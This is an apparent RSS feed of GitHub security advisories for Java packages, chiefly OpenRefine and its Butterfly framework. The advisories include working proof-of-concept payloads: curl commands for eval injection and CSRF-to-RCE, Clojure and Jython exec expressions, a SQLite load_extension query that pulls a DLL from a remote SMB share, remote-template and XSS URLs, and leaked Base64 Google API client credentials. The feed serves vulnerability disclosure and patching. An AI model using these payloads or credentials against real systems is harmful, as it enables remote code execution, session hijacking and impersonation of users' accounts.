<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
    <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
    <updated>2024-10-25T00:04:46.791Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
    <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[org.apache.syncope.client:syncope-client-console] Apache Syncope: Stored XSS in Console and Enduser]]></title>
        <id>https://github.com/advisories/GHSA-jmrf-85g8-x8xv</id>
        <link href="https://github.com/advisories/GHSA-jmrf-85g8-x8xv"/>
        <updated>2024-10-24T19:00:47.000Z</updated>
        <content type="html"><![CDATA[<p>When editing objects in the Syncope Console, incomplete HTML tags could be used to bypass HTML sanitization. This made it possible to inject stored XSS payloads which would trigger for other users during ordinary usage of the application.
XSS payloads could also be injected in Syncope Enduser when editing “Personal Information” or “User Requests”: such payloads would trigger for administrators in Syncope Console, thus enabling session hijacking.</p>
<p>Users are recommended to upgrade to version 3.0.9, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-45031">https://nvd.nist.gov/vuln/detail/CVE-2024-45031</a></li>
<li><a href="https://lists.apache.org/thread/fn567pfmo3s55ofkc42drz8b4kgbhp9m">https://lists.apache.org/thread/fn567pfmo3s55ofkc42drz8b4kgbhp9m</a></li>
<li><a href="https://github.com/apache/syncope/commit/0c620a9eda2c0927875c129ebae66d2ea94f3e6a">https://github.com/apache/syncope/commit/0c620a9eda2c0927875c129ebae66d2ea94f3e6a</a></li>
<li><a href="https://github.com/apache/syncope/commit/f80d3f6cfbd71acb03ece0f7601f660ee0be7e74">https://github.com/apache/syncope/commit/f80d3f6cfbd71acb03ece0f7601f660ee0be7e74</a></li>
<li><a href="https://syncope.apache.org/security#cve-2024-45031-apache-syncope-stored-xss-in-console-and-enduser">https://syncope.apache.org/security#cve-2024-45031-apache-syncope-stored-xss-in-console-and-enduser</a></li>
<li><a href="https://github.com/advisories/GHSA-jmrf-85g8-x8xv">https://github.com/advisories/GHSA-jmrf-85g8-x8xv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jmrf-85g8-x8xv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-24T15:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:openrefine] OpenRefine has a path traversal in LoadLanguageCommand]]></title>
        <id>https://github.com/advisories/GHSA-qfwq-6jh6-8xx4</id>
        <link href="https://github.com/advisories/GHSA-qfwq-6jh6-8xx4"/>
        <updated>2024-10-24T18:32:41.000Z</updated>
        <content type="html"><![CDATA[<p>The load-language command expects a <code>lang</code> parameter from which it constructs the path of the localization file to load, of the form <code>translations-$LANG.json</code>.
When doing so, it does not check that the resulting path is in the expected directory, which means that this command could be exploited to read other JSON files on the file system.</p>
<p>The command should be patched by checking that the normalized path is in the expected directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-qfwq-6jh6-8xx4">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-qfwq-6jh6-8xx4</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/24d084052dc55426fe460f2a17524fd18d28b20c">https://github.com/OpenRefine/OpenRefine/commit/24d084052dc55426fe460f2a17524fd18d28b20c</a></li>
<li><a href="https://github.com/advisories/GHSA-qfwq-6jh6-8xx4">https://github.com/advisories/GHSA-qfwq-6jh6-8xx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qfwq-6jh6-8xx4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-24T18:32:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:openrefine] OpenRefine leaks Google API credentials in releases]]></title>
        <id>https://github.com/advisories/GHSA-3pg4-qwc8-426r</id>
        <link href="https://github.com/advisories/GHSA-3pg4-qwc8-426r"/>
        <updated>2024-10-24T18:30:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>OpenRefine releases contain Google API authentication keys ("client id" and "client secret") which can be extracted from released artifacts. For instance, download the package for OpenRefine 3.8.2 on linux. It contains the file <code>openrefine-3.8.2/webapp/extensions/gdata/module/MOD-INF/lib/openrefine-gdata.jar</code>, which can be extracted.
This archive then contains the file <code>com/google/refine/extension/gdata/GoogleAPIExtension.java</code>, which contains the following lines:</p>
<pre><code class="language-java">    // For a production release, the second parameter (default value) can be set
    // for the following three properties (client_id, client_secret, and API key) to
    // the production values from the Google API console
    private static final String CLIENT_ID = System.getProperty("ext.gdata.clientid", new String(Base64.getDecoder().decode("ODk1NTU1ODQzNjMwLWhkZWwyN3NxMDM5ZjFwMmZ0aGE2M2VvcWFpY2JwamZoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29t")));
    private static final String CLIENT_SECRET = System.getProperty("ext.gdata.clientsecret", new String(Base64.getDecoder().decode("R2V2TnZiTnA2a3IxeDd5c3VZNENmYlNo")));
</code></pre>
<p>The Base64 encoding can then be decoded to obtain the client id and client secret.
Those credentials can then be used by other applications to request access to Google accounts, pretending they are OpenRefine. This assumes that they also get access to the user access tokens, which this vulnerability doesn't expose by itself.</p>
<h3 id="patches">Patches</h3>
<p>The bundled credentials should be revoked.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Users should revoke access to their Google account if they have connected it to OpenRefine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3pg4-qwc8-426r">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3pg4-qwc8-426r</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/07dd61e00bb7f472ddcb243631299fba95ad90dd">https://github.com/OpenRefine/OpenRefine/commit/07dd61e00bb7f472ddcb243631299fba95ad90dd</a></li>
<li><a href="https://github.com/advisories/GHSA-3pg4-qwc8-426r">https://github.com/advisories/GHSA-3pg4-qwc8-426r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3pg4-qwc8-426r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-24T18:30:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine.dependencies:butterfly] Butterfly's parseJSON, getJSON functions eval malicious input, leading to remote code execution (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-mpcw-3j5p-p99x</id>
        <link href="https://github.com/advisories/GHSA-mpcw-3j5p-p99x"/>
        <updated>2024-10-24T18:27:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Usage of the <code>Butterfly.prototype.parseJSON</code> or <code>getJSON</code> functions on an attacker-controlled crafted input string allows the attacker to execute arbitrary JavaScript code on the server.</p>
<p>Since Butterfly JavaScript code has access to Java classes, it can run arbitrary programs.</p>
<h3 id="details">Details</h3>
<p>The <code>parseJSON</code> function (edu/mit/simile/butterfly/Butterfly.js:64) works by calling <code>eval</code>, an approach that goes back to the original library by Crockford, before JSON was part of the ECMAScript language. It uses a regular expression to remove strings from the input, then checks that there are no unexpected characters in the non-string remainder.</p>
<p>However, the regex is imperfect, as was <a href="https://dev.to/mikesamuel/2008-silently-securing-jsonparse-5cbb">discovered earlier by Mike Samuel</a>; specifically, the "cleaner" can be tricked into treating part of the input as a string that the "evaluator" does not, because of a difference in interpretation regarding the <a href="https://unicode-explorer.com/c/200D">the Unicode zero-width joiner character</a>. Representing that character with a visible symbol, a malicious input looks like:</p>
<pre><code class="language-js">"\�\", Packages.java.lang.Runtime.getRuntime().exec('gnome-calculator')) // "
</code></pre>
<p>This is understood...</p>
<ul>
<li>by <code>JSON_cleaning_RE</code> as a single string, and because it is a string it can be collapsed to nothing, which is not problematic, so the original input proceeds to <code>eval</code>.</li>
<li>by the <code>eval</code> function, which ignores zero-width joiners entirely, as a string containing a single escaped backslash, followed by a comma, then a function call, closing parenthesis, and finally a line comment.</li>
</ul>
<p>The function call is evaluated, and a calculator is opened.</p>
<p>Possible mitigations and additional defenses could include:</p>
<ul>
<li>Replacing the JSON implementation with Rhino's built-in implementation.</li>
<li>Dropping all JSON-related and JSONP-related code entirely.</li>
<li>Restricting the access the JavaScript controller code has to the rest of the system by using <code>initSafeStandardObjects</code> instead of <code>initStandardObjects</code>, using <code>setClassShutter</code>, and so on.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Change OpenRefine <code>core</code> <code>controller.js</code> to add a call to the vulnerable <code>getJSON</code> function:</p>
<pre><code class="language-diff">diff --git a/main/webapp/modules/core/MOD-INF/controller.js b/main/webapp/modules/core/MOD-INF/controller.js
index 4ceba0676..1ce0936d2 100644
--- a/main/webapp/modules/core/MOD-INF/controller.js
+++ b/main/webapp/modules/core/MOD-INF/controller.js
@@ -631,0 +632,5 @@ function process(path, request, response) {
+    if (path == "getjsontest") {
+      butterfly.getJSON(request);
+      return true;
+    }
+
</code></pre>
<p>Then, restart OpenRefine and submit the malicious request. For example, the following <code>bash</code> command (with $' quoting) should do it:</p>
<pre><code>curl -H 'Content-Type: application/json;charset=utf-8' --data $'"\\\u200d\\", Packages.java.lang.Runtime.getRuntime().exec(\'gnome-calculator\')) // "' http://localhost:3333/getjsontest
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any JavaScript controller that calls one of these functions is vulnerable to remote code execution.</p>
<p>OpenRefine itself seems unaffected; both OpenRefine and jQuery have their own functions also called parseJSON and getJSON, but those are unrelated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-mpcw-3j5p-p99x">https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-mpcw-3j5p-p99x</a></li>
<li><a href="https://github.com/OpenRefine/simile-butterfly/commit/2ad1fa4cd8afe3c920c8e6e04fe7a7df5cf8294e">https://github.com/OpenRefine/simile-butterfly/commit/2ad1fa4cd8afe3c920c8e6e04fe7a7df5cf8294e</a></li>
<li><a href="https://github.com/advisories/GHSA-mpcw-3j5p-p99x">https://github.com/advisories/GHSA-mpcw-3j5p-p99x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpcw-3j5p-p99x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-24T18:27:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine.dependencies:butterfly] Butterfly has path/URL confusion in resource handling leading to multiple weaknesses]]></title>
        <id>https://github.com/advisories/GHSA-3p8v-w8mr-m3x8</id>
        <link href="https://github.com/advisories/GHSA-3p8v-w8mr-m3x8"/>
        <updated>2024-10-24T21:46:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Butterfly framework uses the <code>java.net.URL</code> class to refer to (what are expected to be) local resource files, like images or templates. This works: "opening a connection" to these URLs opens the local file. However, if a <code>file:/</code> URL is directly given where a relative path (resource name) is expected, this is also accepted in some code paths; the app then fetches the file, from a remote machine if indicated, and uses it as if it was a trusted part of the app's codebase.</p>
<p>This leads to multiple weaknesses and potential weaknesses:</p>
<ul>
<li>An attacker that has network access to the application could use it to gain access to files, either on the the server's filesystem (path traversal) or shared by nearby machines (server-side request forgery with e.g. SMB).</li>
<li>An attacker that can lead or redirect a user to a crafted URL belonging to the app could cause arbitrary attacker-controlled JavaScript to be loaded in the victim's browser (cross-site scripting).</li>
<li>If an app is written in such a way that an attacker can influence the resource name used for a template, that attacker could cause the app to fetch and execute an attacker-controlled template (remote code execution).</li>
</ul>
<h3 id="details">Details</h3>
<p>The <code>edu.mit.simile.butterfly.ButterflyModuleImpl.getResource</code> method converts a resource name into an URL, for instance:</p>
<pre><code>images/logo-gem-126.svg
file:/C:/Users/Wander/IdeaProjects/OpenRefine/main/webapp/modules/core/images/logo-gem-126.svg
</code></pre>
<p>If the resource name already starts with <code>file:/</code>, it is passed through unmodified (line 287). There is no check that the resulting URL is inside the expected directory or on the same machine.</p>
<p>The default implementation for <code>process</code> in <code>ButterflyModuleImpl</code> is to serve a named resource, which makes it vulnerable. The Velocity template library is bound to the same <code>getResource</code> implementation through the <code>ButterflyResourceLoader</code> class, which means it is also vulnerable if template resource names can somehow be influenced by an attacker.</p>
<h3 id="poc">PoC</h3>
<p>This demonstration has been tested with <a href="https://github.com/OpenRefine/OpenRefine">OpenRefine</a> on a Windows machine. Start OpenRefine, create a file (here <code>example.js</code>) with some contents, then concatenate the OpenRefine URL and its <code>file:/</code> URL, as follows:</p>
<pre><code>http://localhost:3333/file:/C:/Users/Wander/example.js
</code></pre>
<p>The file is read and sent to the browser. Then, visit:</p>
<pre><code>http://localhost:3333/file:%2f%2fwandernauta.nl/public/demo.html
</code></pre>
<p>Assuming there are no firewalls in the way, the HTML page is retrieved from the public SMB (Samba) network share and sent to the browser, which executes the embedded JavaScript.</p>
<p>In the case of OpenRefine specifically, to demonstrate the attacker-controlled template name case:</p>
<pre><code>http://localhost:3333/file:%2f%2fwandernauta.nl/public/index
</code></pre>
<p>An <code>index.vt</code> template containing the snippet above is retrieved from the same share, which is then executed; the Windows calculator opens.</p>
<h3 id="impact">Impact</h3>
<p>Depending on how the framework is used: path traversal, XSS, SSRF; potentially RCE.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-3p8v-w8mr-m3x8">https://github.com/OpenRefine/simile-butterfly/security/advisories/GHSA-3p8v-w8mr-m3x8</a></li>
<li><a href="https://github.com/OpenRefine/simile-butterfly/commit/537f64bfa72746f8b21d4bda461fad843435319c">https://github.com/OpenRefine/simile-butterfly/commit/537f64bfa72746f8b21d4bda461fad843435319c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47883">https://nvd.nist.gov/vuln/detail/CVE-2024-47883</a></li>
<li><a href="https://github.com/advisories/GHSA-3p8v-w8mr-m3x8">https://github.com/advisories/GHSA-3p8v-w8mr-m3x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p8v-w8mr-m3x8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-24T18:16:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:openrefine] OpenRefine's error page lacks escaping, leading to potential Cross-site Scripting on import of malicious project]]></title>
        <id>https://github.com/advisories/GHSA-j8hp-f2mj-586g</id>
        <link href="https://github.com/advisories/GHSA-j8hp-f2mj-586g"/>
        <updated>2024-10-24T21:46:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The built-in "Something went wrong!" error page includes the exception message and exception traceback without escaping HTML tags, enabling injection into the page if an attacker can reliably produce an error with an attacker-influenced message.</p>
<p>It appears that the only way to reach this code in OpenRefine itself is for an attacker to somehow convince a victim to import a malicious file, as in GHSA-m88m-crr9-jvqq, which may be difficult.  However, out-of-tree extensions may add their own calls to <code>respondWithErrorPage</code>.</p>
<h3 id="details">Details</h3>
<p>The <code>Command.respondWithErrorPage</code> (through <code>HttpUtilities.respondWithErrorPage</code>) function renders the Velocity template <code>error.vt</code>, which contains the <code>$message</code> and <code>$stack</code> variables, which are included in the response as-is:</p>
<p><a href="https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53">https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53</a></p>
<p>However, the message can contain HTML tags, which would then be interpreted by the browser. A mitigation would be to escape both the message and stack trace, perhaps using Guava's HTML escaper.</p>
<p>Flows that report errors as <code>application/json</code> responses are not interpreted by the browser and so not affected by this issue.</p>
<h3 id="poc">PoC</h3>
<p>In OpenRefine, use the "Import project" feature to import the following URL (or upload it as a file): <a href="https://wandernauta.nl/oa/example.tar.gz">https://wandernauta.nl/oa/example.tar.gz</a></p>
<p>A JavaScript alert appears.</p>
<h3 id="impact">Impact</h3>
<p>Execution of arbitrary JavaScript in the victim's browser, provided the victim can be convinced to import a malicious project. The script can do anything the user can do.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-j8hp-f2mj-586g">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-j8hp-f2mj-586g</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/85594e75e7b36025f7b6a67dcd3ec253c5dff8c2">https://github.com/OpenRefine/OpenRefine/commit/85594e75e7b36025f7b6a67dcd3ec253c5dff8c2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47882">https://nvd.nist.gov/vuln/detail/CVE-2024-47882</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53">https://github.com/OpenRefine/OpenRefine/blob/master/main/webapp/modules/core/error.vt#L52-L53</a></li>
<li><a href="https://github.com/advisories/GHSA-j8hp-f2mj-586g">https://github.com/advisories/GHSA-j8hp-f2mj-586g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j8hp-f2mj-586g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-24T18:13:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:database] OpenRefine's SQLite integration allows filesystem access, remote code execution (RCE)]]></title>
        <id>https://github.com/advisories/GHSA-87cf-j763-vvh8</id>
        <link href="https://github.com/advisories/GHSA-87cf-j763-vvh8"/>
        <updated>2024-10-24T18:11:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the <code>database</code> extension, the "enable_load_extension" property can be set for the SQLite integration, enabling an attacker to load (local or remote) extension DLLs and so run arbitrary code on the server.</p>
<p>The attacker needs to have network access to the OpenRefine instance.</p>
<h3 id="details">Details</h3>
<p>The <code>database</code> extension, with some restrictions, lets users connect to any database they wish by filling in different parts of the JDBC URL that is used. For the SQLite integration, the extension expects a file path pointing to a database file (or a place where such a file can be created). This means that users can:</p>
<ul>
<li>Read files on local or SMB filesystems, provided they are SQLite databases.</li>
<li>Write to files on local or SMB filesystems, as long as those files are either SQLite databases or empty.</li>
</ul>
<p>This seems to be the expected behavior.</p>
<p>However, by adding <code>?enable_load_extension=true</code> to the filename, a <a href="https://www.sqlite.org/loadext.html">feature</a> is toggled that additionally allows loading and executing shared libraries mentioned in queries, leading to remote code execution. On Windows specifically, those libraries may also come from shared folders.</p>
<p>Possible mitigation and hardening steps could include:</p>
<ul>
<li>Having users upload the SQLite database file they want to look at, storing it under some safe name, then opening that, rather than accepting a file path</li>
<li>If that is not feasible: making the path relative to, and checking that it does not escape, the workspace directory</li>
<li>If that is also not feasible: adding additional checks so that the path at least does not point to other machines or add JDBC parameters</li>
<li>Always using the READONLY open mode</li>
<li>Explicitly setting enable_load_extension to off</li>
<li>Enforcing <a href="https://www.sqlite.org/security.html">stricter limits</a> and similar precautions</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Tested on a Windows 11 machine. </p>
<ol>
<li>Start OpenRefine and choose "Create project", "Database", database type "SQLite".</li>
<li>Type a writable file path followed by <code>?enable_load_extension=true</code>.</li>
<li>Click Connect. The connection should succeed.</li>
<li>Use <code>SELECT load_extension('\\wandernauta.nl\public\libcalculator.dll');</code> as the query.</li>
<li>Assuming there are no firewalls in the way, a few Windows calculators should open.</li>
</ol>
<p>The same file is available from <a href="https://wandernauta.nl/libcalculator.dll">https://wandernauta.nl/libcalculator.dll</a> if needed.</p>
<h3 id="impact">Impact</h3>
<p>Remote code execution for attackers with network access to OpenRefine.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/853a1d91662e7dc278a9a94a38be58de04494056">https://github.com/OpenRefine/OpenRefine/commit/853a1d91662e7dc278a9a94a38be58de04494056</a></li>
<li><a href="https://github.com/advisories/GHSA-87cf-j763-vvh8">https://github.com/advisories/GHSA-87cf-j763-vvh8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87cf-j763-vvh8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-24T18:11:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:openrefine] OpenRefine has a reflected cross-site scripting vulnerability (XSS) from POST request in ExportRowsCommand]]></title>
        <id>https://github.com/advisories/GHSA-79jv-5226-783f</id>
        <link href="https://github.com/advisories/GHSA-79jv-5226-783f"/>
        <updated>2024-10-24T21:46:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>export-rows</code> command can be used in such a way that it reflects part of the request verbatim, with a Content-Type header also taken from the request.</p>
<p>An attacker could lead a user to a malicious page that submits a form POST that contains  embedded JavaScript code. This code would then be included in the response, along with an attacker-controlled <code>Content-Type</code> header, and so potentially executed in the victim's browser as if it was part of OpenRefine.</p>
<p>The attacker must know a valid project ID of a project that contains at least one row.</p>
<h3 id="details">Details</h3>
<p>The malicious form sets <code>contentType</code> to <code>text/html</code> (ExportRowsCommand.java line 101) and <code>preview</code> to <code>true</code> (line 107). This combination causes the browser to treat what OpenRefine thinks of as an export preview as a regular webpage.</p>
<p>It would be safer if the <code>export-rows</code> command did not allow overriding the Content-Type header at all, instead relying on the exporter to provide the correct Content-Type. It could also require a CSRF token. As an additional measure, it could add a Content-Security-Policy header to the response disabling scripts and such entirely.</p>
<p>At least the CSV exporter (<code>separator</code> and <code>lineSeparator</code> fields) and templating exporter (any field) are affected. It may also be possible to inject into the <code>dateSettings.custom</code> field or the SQL exporter default value field, if the project contains date or null cells.</p>
<h3 id="poc">PoC</h3>
<p>An example form that demonstrates the issue is available on <a href="https://wandernauta.nl/os/">https://wandernauta.nl/os/</a>.</p>
<h3 id="impact">Impact</h3>
<p>Execution of arbitrary JavaScript in the user's browser. The attacker-provided code can do anything the user can do, including deleting projects, retrieving database passwords, or executing arbitrary Jython or Closure expressions, if those extensions are also present.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-79jv-5226-783f">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-79jv-5226-783f</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/8060477fa53842ebabf43b63e039745932fa629d">https://github.com/OpenRefine/OpenRefine/commit/8060477fa53842ebabf43b63e039745932fa629d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47880">https://nvd.nist.gov/vuln/detail/CVE-2024-47880</a></li>
<li><a href="https://github.com/advisories/GHSA-79jv-5226-783f">https://github.com/advisories/GHSA-79jv-5226-783f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79jv-5226-783f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-24T18:00:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:main] OpenRefine's PreviewExpressionCommand, which is eval, lacks protection against cross-site request forgery (CSRF)]]></title>
        <id>https://github.com/advisories/GHSA-3jm4-c6qf-jrh3</id>
        <link href="https://github.com/advisories/GHSA-3jm4-c6qf-jrh3"/>
        <updated>2024-10-24T21:46:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Lack of CSRF protection on the <code>preview-expression</code> command means that visiting a malicious website could cause an attacker-controlled expression to be executed. The expression can contain arbitrary Clojure or Python code.</p>
<p>The attacker must know a valid project ID of a project that contains at least one row.</p>
<h3 id="details">Details</h3>
<p>The <code>com.google.refine.commands.expr.PreviewExpressionCommand</code> class contains the following comment:</p>
<pre><code>/**
 * The command uses POST but does not actually modify any state so it does not require CSRF.
 */
</code></pre>
<p>However, this appears to be false (or no longer true). The expression being previewed (executed) can be written in GREL, Python, or Clojure. Since there are no restrictions on what code can be executed, the expression can do anything the user running OpenRefine can do. For instance, the following expressions start a calculator:</p>
<pre><code>clojure:(.exec (Runtime/getRuntime) "gnome-calculator")
</code></pre>
<pre><code>jython:import os;os.system("gnome-calculator")
</code></pre>
<p>The lack of restrictions on expressions is arguably not a problem if the user is typing their own expressions into OpenRefine: they could have just as well typed them into Clojure or Python directly. However, since the <code>preview-expression</code> command does not check for a CSRF token, the expression can actually come from a HTML form submitted by a different origin, including arbitrary websites.</p>
<p>Issue #2164 suggested adding CSRF protection to all endpoints, but this endpoint was skipped (and the above comment added) in the associated PR #2182.</p>
<h3 id="poc">PoC</h3>
<p>An example "malicious" page is at <a href="https://wandernauta.nl/or/">https://wandernauta.nl/or/</a> (of course, actual malicious pages would not wait for the victim to press the submit button).</p>
<p>The following curl command (substituting the project ID) also demonstrates the issue:</p>
<pre><code class="language-sh">curl -d project=123456789 -d cellIndex=1 -d rowIndices='[0]' -d 'expression=clojure:(.exec (Runtime/getRuntime) "gnome-calculator")' http://localhost:3333/command/core/preview-expression/
</code></pre>
<h3 id="impact">Impact</h3>
<p>CSRF into remote code execution, provided the attacker knows at least one project ID in the victim's workspace and can convince the victim to open a malicious webpage.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3jm4-c6qf-jrh3">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-3jm4-c6qf-jrh3</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/090924ca923489b6c94397cf1f5df7f7f78f0126">https://github.com/OpenRefine/OpenRefine/commit/090924ca923489b6c94397cf1f5df7f7f78f0126</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47879">https://nvd.nist.gov/vuln/detail/CVE-2024-47879</a></li>
<li><a href="https://github.com/advisories/GHSA-3jm4-c6qf-jrh3">https://github.com/advisories/GHSA-3jm4-c6qf-jrh3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3jm4-c6qf-jrh3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-24T17:58:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.openrefine:extensions] OpenRefine has a reflected cross-site scripting vulnerability (XSS) in GData extension (authorized.vt)]]></title>
        <id>https://github.com/advisories/GHSA-pw3x-c5vp-mfc3</id>
        <link href="https://github.com/advisories/GHSA-pw3x-c5vp-mfc3"/>
        <updated>2024-10-24T21:46:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>/extension/gdata/authorized</code> endpoint includes the <code>state</code> GET parameter verbatim in a <code>&lt;script&gt;</code> tag in the output, so without escaping.</p>
<p>An attacker could lead or redirect a user to a crafted URL containing JavaScript code, which would then cause that code to be executed in the victim's browser as if it was part of OpenRefine.</p>
<h3 id="details">Details</h3>
<p>The <code>state</code> GET parameter is read from:</p>
<ul>
<li>extensions/gdata/module/MOD-INF/controller.js:105</li>
</ul>
<p>It is used (as <code>$state</code>) in:</p>
<ul>
<li>extensions/gdata/module/authorized.vt:43</li>
</ul>
<p>There is no check that the state has the expected format (base64-encoded JSON with values like "openrefine123..." and "cb123..."), or that the page was indeed opened as part of the authorization flow.</p>
<h3 id="poc">PoC</h3>
<p>Navigate to:</p>
<pre><code>http://localhost:3333/extension/gdata/authorized?state=%22,alert(1),%22&amp;error=
</code></pre>
<p>An alert box pops up.</p>
<p>The gdata extension needs to be present. No other configuration is needed; specifically, it is not required to have a client ID or client secret set.</p>
<h3 id="impact">Impact</h3>
<p>Execution of arbitrary JavaScript in the user's browser. The attacker-provided code can do anything the user can do, including deleting projects, retrieving database passwords, or executing arbitrary Jython or Closure expressions, if those extensions are also present.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-pw3x-c5vp-mfc3">https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-pw3x-c5vp-mfc3</a></li>
<li><a href="https://github.com/OpenRefine/OpenRefine/commit/10bf0874d67f1018a58b3732332d76b840192fea">https://github.com/OpenRefine/OpenRefine/commit/10bf0874d67f1018a58b3732332d76b840192fea</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47878">https://nvd.nist.gov/vuln/detail/CVE-2024-47878</a></li>
<li><a href="https://github.com/advisories/GHSA-pw3x-c5vp-mfc3">https://github.com/advisories/GHSA-pw3x-c5vp-mfc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pw3x-c5vp-mfc3</uri>
        </author>
        <category label="severity" term="HIGH"/>
